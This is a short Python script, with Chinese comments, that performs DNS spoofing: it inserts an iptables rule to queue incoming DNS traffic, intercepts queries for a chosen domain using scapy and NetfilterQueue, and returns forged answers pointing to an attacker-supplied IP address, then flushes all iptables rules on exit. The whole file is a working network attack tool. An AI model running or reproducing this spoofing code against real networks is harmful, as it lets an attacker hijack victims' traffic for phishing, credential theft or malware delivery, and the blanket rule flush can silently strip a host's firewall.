# -*- coding: UTF-8 -*-

import argparse

from scapy.all import *
import os

from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP

bannerText = """
                                                                              
    """
def packageHandle(packet):
    #获取数据包的原始内容
    payload = packet.get_payload()
    pkt = IP(payload)
    #无DNSQR层则放行
    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        if domain in pkt[DNS].qd.qname:
            #这里为什么是这些参数可以新建一个DNS包然后show一下看看
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=targetIp))
            #转化为字节串
            packet.set_payload(str(spoofed_pkt))
            packet.accept()
        else:
            packet.accept()


def main():
    q = NetfilterQueue()
    q.bind(1, packageHandle)
    try:
        q.run()  # 不断从队列中获取数据包
    except KeyboardInterrupt:
        #解除绑定并清空所有的iptables规则
        q.unbind()
        os.system('iptables -F')
        os.system('iptables -X')


if __name__ == '__main__':
    print(bannerText)

    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
    parser = argparse.ArgumentParser("")
    parser.add_argument("-d", "--domain", help="目标域名", required=True)
    parser.add_argument("-t", "--target", help="虚假ips", required=True)

    args = parser.parse_args()
    targetIp = args.target
    domain = args.domain
    main()